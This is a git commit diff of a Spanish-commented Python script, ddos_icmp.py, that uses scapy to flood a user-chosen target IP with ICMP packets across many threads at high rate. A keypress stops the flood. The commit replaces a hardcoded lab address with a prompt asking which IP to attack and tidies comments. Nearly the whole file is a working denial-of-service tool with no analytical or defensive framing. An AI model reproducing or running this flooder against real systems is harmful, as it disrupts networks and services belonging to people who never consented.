b3cf948091b6a62dfb8566ea1efff5d4d9d5991a
robertoapa <58830564+robertoapa@users.noreply.github.com>
2024-05-22 19:21:40 +0200

    Limpieza de código ddos_icmp.py

--- ddos_icmp.py
+++ ddos_icmp.py
@@ -5,37 +5,17 @@ from scapy.layers.inet import IP, ICMP, Ether
 from pynput import keyboard
 import subprocess
 
-# destino = input("ip a la que quieres atacar: ")
+destino = input("ip a la que quieres atacar: ")
 num_hilos= int(input("cuantos hilos quieres usar: "))
 
-destino = "10.0.2.15"
+#destino = "10.0.2.15"
 # num_hilos = 200
-total = 0
 bucle = True
 paquete = Ether()/IP(dst=destino)/ICMP()
 def traza_icmp(ip):
-    #paquete = Ether()/IP(dst=ip)/ICMP()
     while bucle:
-        # ans, unans = sr(IP(dst=ip)/ICMP(), timeout=1, verbose=False, inter=0)
-        # sendpfast(paquete, verbose=0)
         sendpfast(paquete, pps=30000, loop=2000)
    
-
-
-def ping(ip):
-    global total
-    while bucle:
-        try:
-            salida = subprocess.check_output(['ping', '-n', '4', ip])
-            total = total+1
-            print(total)
-            # print("Ping exitoso:")
-            # print(salida.decode('utf-8'))
-        except subprocess.CalledProcessError:
-            print("Ping fallido: No se pudo alcanzar el host.")
-
-
-
 #-----------Crear hilos--------------------
 hilos = []
 def crear_hilos(num):
@@ -45,7 +25,7 @@ def crear_hilos(num):
         hilo.start()
         hilos.append(hilo)
 
-
+#------------funcion para detener bucle al presionar tecla 'f'----------
 def on_press(key):
     global bucle
     try:
@@ -56,12 +36,13 @@ def on_press(key):
     except AttributeError:
         pass
 
+#----------Crear listener para leer las pulsaciones del teclado------
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
-
-
+#-------Iniciar función que crea los hilos-----
 crear_hilos(num_hilos)
+#--------bucle para finalizar los hilos------
 for hilo in hilos:
     hilo.join()
 
